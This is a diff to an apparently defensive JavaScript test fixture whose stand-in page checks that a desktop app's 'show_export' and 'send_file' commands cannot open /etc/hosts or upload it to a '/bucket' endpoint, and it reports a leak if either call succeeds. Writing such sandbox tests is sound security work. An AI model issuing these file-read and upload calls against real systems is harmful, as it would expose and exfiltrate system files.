@@ -44,11 +44,24 @@ const STAND_IN_PAGE = `<!doctype html><title>Stand-in dashboard</title>
           downloads: [{ name: "talk.mp4", url: location.origin + "/media/talk.mp4" }],
         })
           .then((saved) =>
-            // Nothing outside the app's exports folder can be opened or shown.
-            invoke("show_export", { path: "/etc/hosts" }).then(
-              () => note + ", shows anything",
-              () => note + ", saved " + saved.files.length + " to " + saved.folder,
-            ),
+            // Nothing outside the app's exports folder can be opened or shown, and only
+            // files chosen in the app's own picker can be sent.
+            invoke("show_export", { path: "/etc/hosts" })
+              .then(
+                () => "shows anything",
+                () =>
+                  invoke("send_file", {
+                    path: "/etc/hosts",
+                    url: location.origin + "/bucket",
+                    contentType: "text/plain",
+                  }).then(
+                    () => "sends anything",
+                    () => null,
+                  ),
+              )
+              .then((leak) =>
+                leak ? note + ", " + leak : note + ", saved " + saved.files.length + " to " + saved.folder,
+              ),
           );
       })
       .catch((error) => say("refused: " + error))
